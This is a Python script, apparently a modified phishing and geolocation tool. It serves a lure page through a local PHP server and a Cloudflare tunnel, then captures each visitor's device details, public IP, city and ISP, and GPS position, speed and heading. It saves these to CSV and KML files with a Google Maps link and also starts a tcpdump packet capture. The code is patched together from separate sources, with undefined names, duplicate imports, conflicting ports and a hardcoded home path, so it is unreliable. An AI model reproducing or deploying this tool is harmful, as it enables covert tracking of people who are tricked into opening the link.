#!/usr/bin/env python3

VERSION = '1.3.0'

R = '\033[31m'  # red
G = '\033[32m'  # green
C = '\033[36m'  # cyan
W = '\033[0m'   # white
Y = '\033[33m'  # yellow

import sys
import argparse
import requests
import traceback
import shutil	
import subprocess
import time
import os
import shutil
import re
from os import path, kill, mkdir, getenv, environ
from json import loads, decoder
from packaging import version
import utils

parser = argparse.ArgumentParser()
parser.add_argument('-k', '--kml', help='KML filename')
parser.add_argument('-p', '--port', type=int, default=8080, help='Web server port [ Default : 8080 ]')
parser.add_argument('-u', '--update', action='store_true', help='Check for updates')
parser.add_argument('-v', '--version', action='store_true', help='Prints version')
parser.add_argument('-t', '--template', type=int, help='Load template and loads parameters from env variables')
parser.add_argument('-d', '--debugHTTP', type=bool, default = False, help='Disable HTTPS redirection for testing only')


args = parser.parse_args()
kml_fname = args.kml
port = getenv("PORT") or args.port
chk_upd = args.update
print_v = args.version
if (getenv("DEBUG_HTTP") and (getenv("DEBUG_HTTP") == "1" or getenv("DEBUG_HTTP").lower() == "true")) or args.debugHTTP == True:
	environ["DEBUG_HTTP"] = "1"
else:
	environ["DEBUG_HTTP"] = "0"

templateNum = int(getenv("TEMPLATE")) if getenv("TEMPLATE") and getenv("TEMPLATE").isnumeric() else args.template


path_to_script = path.dirname(path.realpath(__file__))

SITE = ''
SERVER_PROC = ''
LOG_DIR = f'{path_to_script}/logs'
DB_DIR = f'{path_to_script}/db'
LOG_FILE = f'{LOG_DIR}/php.log'
DATA_FILE = f'{DB_DIR}/results.csv'
INFO = f'{LOG_DIR}/info.txt'
RESULT = f'{LOG_DIR}/result.txt'
TEMPLATES_JSON = f'{path_to_script}/template/templates.json'
TEMP_KML = f'{path_to_script}/template/sample.kml'
META_FILE = f'{path_to_script}/metadata.json'


if not path.isdir(LOG_DIR):
	mkdir(LOG_DIR)

if not path.isdir(DB_DIR):
	mkdir(DB_DIR)

def chk_update():
	try:
		print('> Fetching Metadata...', end='')
		rqst = requests.get(META_URL, timeout=5)
		meta_sc = rqst.status_code
		if meta_sc == 200:
			print('OK')
			metadata = rqst.text
			json_data = loads(metadata)
			gh_version = json_data['version']
			if version.parse(gh_version) > version.parse(VERSION):
				print(f'> New Update Available : {gh_version}')
			else:
				print('> Already up to date.')
	except Exception as exc:
		utils.print(f'Exception : {str(exc)}')


if chk_upd is True:
	chk_update()
	sys.exit()

if print_v is True:
	utils.print(VERSION)
	sys.exit()

import importlib
from csv import writer
from time import sleep
import subprocess as subp
from ipaddress import ip_address
from signal import SIGTERM


def banner():
	with open(META_FILE, 'r') as metadata:
		json_data = loads(metadata.read())
		twitter_url = json_data['twitter']
		comms_url = json_data['comms']

	art = r'''
 

____   ____                     .__/\        __      __      ___.       _________                                
\   \ /   /____    _____   _____|__)/______ /  \    /  \ ____\_ |__    /   _____/ ______________  __ ___________ 
 \   Y   /\__  \  /     \ /  ___/  |/  ___/ \   \/\/   // __ \| __ \   \_____  \_/ __ \_  __ \  \/ // __ \_  __ \
  \     /  / __ \|  Y Y  \\___ \|  |\___ \   \        /\  ___/| \_\ \  /        \  ___/|  | \/\   /\  ___/|  | \/
   \___/  (____  /__|_|  /____  >__/____  >   \__/\  /  \___  >___  / /_______  /\___  >__|    \_/  \___  >__|   
               \/      \/     \/        \/         \/       \/    \/          \/     \/                 \/       

'''
 
	utils.print(f'{G}{art}{W}\n')
	utils.print(f'{G}[>] {C}Created By   : {W}vamsi')
	utils.print(f'{G}[>] {C}Version      : {W}{VERSION}\n')




HOST = "localhost"
PORT = 8080

def create_directory(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)

def download(url, output_file):
    subprocess.run(["curl", "-L", url, "-o", output_file])

def kill_pid():
    if os.path.exists(".server/.pid"):
        with open(".server/.pid", "r") as pid_file:
            pid = pid_file.read()
            try:
                os.kill(int(pid), 9)
            except ProcessLookupError:
                pass
        os.remove(".server/.pid")


def cusport():
    print()
    p_ans = input(f"{RED}[{WHITE}?{RED}]{ORANGE} Do You Want A Custom Port {GREEN}[{CYAN}y{GREEN}/{CYAN}N{GREEN}]: {ORANGE}")
    if p_ans.lower() == 'y':
        print()
        cu_p = input(f"{RED}[{WHITE}-{RED}]{ORANGE} Enter Your Custom  Port [1-9999] : {WHITE}")
        if cu_p and cu_p.isdigit() and 1 <= int(cu_p) <= 9999:
            global PORT
            PORT = int(cu_p)
            print()
        else:
            print(f"\n\n{RED}[{WHITE}!{RED}]{RED} Invalid Port : {cu_p}, Try Again...{WHITE}")
            time.sleep(2)
            clear()
            banner_small()
            cusport()
    else:
        print(f"\n\n{RED}[{WHITE}-{RED}]{BLUE} Using Default Port {PORT}...{WHITE}\n")


def setup_site():
    RED = '\033[91m'
    WHITE = '\033[0m'
    BLUE = '\033[94m'

    print(f"\n{RED}[{WHITE}-{RED}]{BLUE} Setting up server...{WHITE}")

    website = "nearyou"  # Replace "nearyou" with the desired website name
    HOST = "127.0.0.1"  # Replace "127.0.0.1" with the desired host address
    PORT = "8080"  # Replace "8080" with the desired port number

    destination_dir = ".server/www"

    if os.path.exists(destination_dir):
        shutil.rmtree(destination_dir)
    
    try:
        os.makedirs(destination_dir)
        shutil.copytree(f".sites/{website}", os.path.join(destination_dir, website))
        shutil.copy(".sites/ip.php", destination_dir)
    except Exception as e:
        print(" ")
        return

    print(f"\n{RED}[{WHITE}-{RED}]{BLUE} Starting PHP server...{WHITE}")

    os.chdir(destination_dir)
    subprocess.Popen(['php', '-S', f"{HOST}:{PORT}"], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)



def start_cloudflared():
    kill_pid()
    cusport()
    print(f"\n[-] Initializing... (http://{HOST}:{PORT})")
    setup_site()
    print("\n[-] Starting Cloudflared...")
    cloudflared_path = os.path.join('/home/vamsi/Downloads/webserver/.server', 'cloudflared')
    
    if not os.path.exists(cloudflared_path):
        print(f"\n[-] Cloudflared binary not found. Please make sure it is available in the '.server' directory.")
        return
    
    try:
        with open(os.devnull, "w") as devnull:
            subprocess.Popen([cloudflared_path, "tunnel", "-url", f"{HOST}:{PORT}", "--logfile", ".server/.cld.log"], stdout=devnull, stderr=devnull)
    except Exception as e:
        print(f"\n[-] An error occurred while starting Cloudflared: {str(e)}")
        return
    
    time.sleep(8)
    
    log_file_path = os.path.join('.server', '.cld.log')
    
    if os.path.exists(log_file_path):
        with open(log_file_path, "r") as log_file:
            log_content = log_file.read()
            cldflr_url_match = re.search(r"https://[-0-9a-z]*\.trycloudflare.com", log_content)
        
        if cldflr_url_match:
            cldflr_url = cldflr_url_match.group()
            custom_url(cldflr_url)
            capture_data()
        else:
            print("[-] Unable to extract Cloudflared URL from the log.")
    else:
        print("[-] Cloudflared log file not found.")




import re
import requests

RED = '\033[91m'
WHITE = '\033[0m'
BLUE = '\033[94m'
GREEN = '\033[92m'
ORANGE = '\033[33m'
CYAN = "\033[96m"


def custom_url(url):
    url = url.strip().lower()
    isgd = "https://is.gd/create.php?format=simple&url="
    shortcode = "https://api.shrtco.de/v2/shorten?url="
    tinyurl = "https://tinyurl.com/api-create.php?url="

    time.sleep(1)
    clear()

    if re.search(r'[-a-zA-Z0-9.]*(trycloudflare.com|loclx.io)', url):
        url = f"{url}"
    else:
        url = "Unable to generate links.m Try after turning on hotspot"

    print(f"\n{RED}[{WHITE}-{RED}]{BLUE} URL 1 : {GREEN}{url}")


def capture_data():
    subprocess.Popen(["tcpdump", "-i", "tun0", "-s", "0", "-w", ".server/.capture.pcap"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def install_cloudflared():
    create_directory(".server")
    if not os.path.exists(".server/cloudflared"):
        print("\n[+] Installing Cloudflared...")
        arch = os.uname().machine
        if "arm" in arch or "Android" in arch:
            download('https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm', '.server/cloudflared')
        elif "aarch64" in arch:
            download('https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64', '.server/cloudflared')
        elif "x86_64" in arch:
            download('https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64', '.server/cloudflared')
        else:
            download('https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386', '.server/cloudflared')







def server():
	print()
	preoc = False
	utils.print(f'{G}[+] {C}Port : {W}{port}\n')
	utils.print(f'{G}[+] {C}Starting PHP Server...{W}', end='')
	cmd = ['php', '-S', f'0.0.0.0:{port}', '-t', f'template/{SITE}/']
	install_cloudflared()
	start_cloudflared()

	with open(LOG_FILE, 'w+') as phplog:
		proc = subp.Popen(cmd, stdout=phplog, stderr=phplog)
		sleep(3)
		phplog.seek(0)
		if 'Address already in use' in phplog.readline():
			preoc = True
		try:
			php_rqst = requests.get(f'http://127.0.0.1:{port}/nearyou/index.html')
			php_sc = php_rqst.status_code
			if php_sc == 200:
				if preoc:
					utils.print(f'{C}[ {G}✔{C} ]{W}')
					utils.print(f'{Y}[!] Server is already running!{W}')
					print()
				else:
					utils.print(f'{C}[ {G}✔{C} ]{W}')
					print()
			else:
				utils.print(f'{C}[ {R}Status : {php_sc}{C} ]{W}')
				cl_quit(proc)
		except requests.ConnectionError:
			utils.print(f'{C}[ {R}✘{C} ]{W}')
			cl_quit(proc)
	return proc

def wait():
	printed = False
	while True:
		sleep(2)
		size = path.getsize(RESULT)
		if size == 0 and printed is False:
			utils.print(f'{G}[+] {C}Waiting for Client...{Y}[ctrl+c to exit]{W}\n')
			printed = True
		if size > 0:
			data_parser()
			printed = False


def data_parser():
	data_row = []
	with open(INFO, 'r') as info_file:
		info_content = info_file.read()
	if not info_content or info_content.strip() == '':
		return
	try:
		info_json = loads(info_content)
	except decoder.JSONDecodeError:
		utils.print(f'{R}[-] {C}Exception : {R}{traceback.format_exc()}{W}')
	else:
		var_os = info_json['os']
		var_platform = info_json['platform']
		var_cores = info_json['cores']
		var_ram = info_json['ram']
		var_vendor = info_json['vendor']
		var_render = info_json['render']
		var_res = info_json['wd'] + 'x' + info_json['ht']
		var_browser = info_json['browser']
		var_ip = info_json['ip']

		data_row.extend([var_os, var_platform, var_cores, var_ram, var_vendor, var_render, var_res, var_browser, var_ip])

		utils.print(f'''{Y}[!] Device Information :{W}

{G}[+] {C}OS         : {W}{var_os}
{G}[+] {C}Platform   : {W}{var_platform}
{G}[+] {C}CPU Cores  : {W}{var_cores}
{G}[+] {C}RAM        : {W}{var_ram}
{G}[+] {C}GPU Vendor : {W}{var_vendor}
{G}[+] {C}GPU        : {W}{var_render}
{G}[+] {C}Resolution : {W}{var_res}
{G}[+] {C}Browser    : {W}{var_browser}
{G}[+] {C}Public IP  : {W}{var_ip}
''')

		if ip_address(var_ip).is_private:
			utils.print(f'{Y}[!] Skipping IP recon because IP address is private{W}')
		else:
			rqst = requests.get(f'https://ipwhois.app/json/{var_ip}')
			s_code = rqst.status_code

			if s_code == 200:
				data = rqst.text
				data = loads(data)
				var_continent = str(data['continent'])
				var_country = str(data['country'])
				var_region = str(data['region'])
				var_city = str(data['city'])
				var_org = str(data['org'])
				var_isp = str(data['isp'])

				data_row.extend([var_continent, var_country, var_region, var_city, var_org, var_isp])

				utils.print(f'''{Y}[!] IP Information :{W}

{G}[+] {C}Continent : {W}{var_continent}
{G}[+] {C}Country   : {W}{var_country}
{G}[+] {C}Region    : {W}{var_region}
{G}[+] {C}City      : {W}{var_city}
{G}[+] {C}Org       : {W}{var_org}
{G}[+] {C}ISP       : {W}{var_isp}
''')

	with open(RESULT, 'r') as result_file:
		results = result_file.read()
		try:
			result_json = loads(results)
		except decoder.JSONDecodeError:
			utils.print(f'{R}[-] {C}Exception : {R}{traceback.format_exc()}{W}')
		else:
			status = result_json['status']
			if status == 'success':
				var_lat = result_json['lat']
				var_lon = result_json['lon']
				var_acc = result_json['acc']
				var_alt = result_json['alt']
				var_dir = result_json['dir']
				var_spd = result_json['spd']

				data_row.extend([var_lat, var_lon, var_acc, var_alt, var_dir, var_spd])

				utils.print(f'''{Y}[!] Location Information :{W}

{G}[+] {C}Latitude  : {W}{var_lat}
{G}[+] {C}Longitude : {W}{var_lon}
{G}[+] {C}Accuracy  : {W}{var_acc}
{G}[+] {C}Altitude  : {W}{var_alt}
{G}[+] {C}Direction : {W}{var_dir}
{G}[+] {C}Speed     : {W}{var_spd}
''')

				utils.print(f'{G}[+] {C}Google Maps : {W}https://www.google.com/maps/place/{var_lat.strip(" deg")}+{var_lon.strip(" deg")}')

				if kml_fname is not None:
					kmlout(var_lat, var_lon)
			else:
				var_err = result_json['error']
				utils.print(f'{R}[-] {C}{var_err}\n')

	csvout(data_row)
	clear()
	return


def kmlout(var_lat, var_lon):
	with open(TEMP_KML, 'r') as kml_sample:
		kml_sample_data = kml_sample.read()

	kml_sample_data = kml_sample_data.replace('LONGITUDE', var_lon.strip(' deg'))
	kml_sample_data = kml_sample_data.replace('LATITUDE', var_lat.strip(' deg'))

	with open(f'{path_to_script}/{kml_fname}.kml', 'w') as kml_gen:
		kml_gen.write(kml_sample_data)

	utils.print(f'{Y}[!] KML File Generated!{W}')
	utils.print(f'{G}[+] {C}Path : {W}{path_to_script}/{kml_fname}.kml')


def csvout(row):
	with open(DATA_FILE, 'a') as csvfile:
		csvwriter = writer(csvfile)
		csvwriter.writerow(row)
	utils.print(f'{G}[+] {C}Data Saved : {W}{path_to_script}/db/results.csv\n')


def clear():
	with open(RESULT, 'w+'):
		pass
	with open(INFO, 'w+'):
		pass


def repeat():
	clear()
	wait()


def cl_quit(proc):
	clear()
	if proc:
		kill(proc.pid, SIGTERM)
	sys.exit()


try:
	banner()
	clear()
	SERVER_PROC = server()
	wait()
	data_parser()
except KeyboardInterrupt:
	utils.print(f'{R}[-] {C}Keyboard Interrupt.{W}')
	cl_quit(SERVER_PROC)
else:
	repeat()
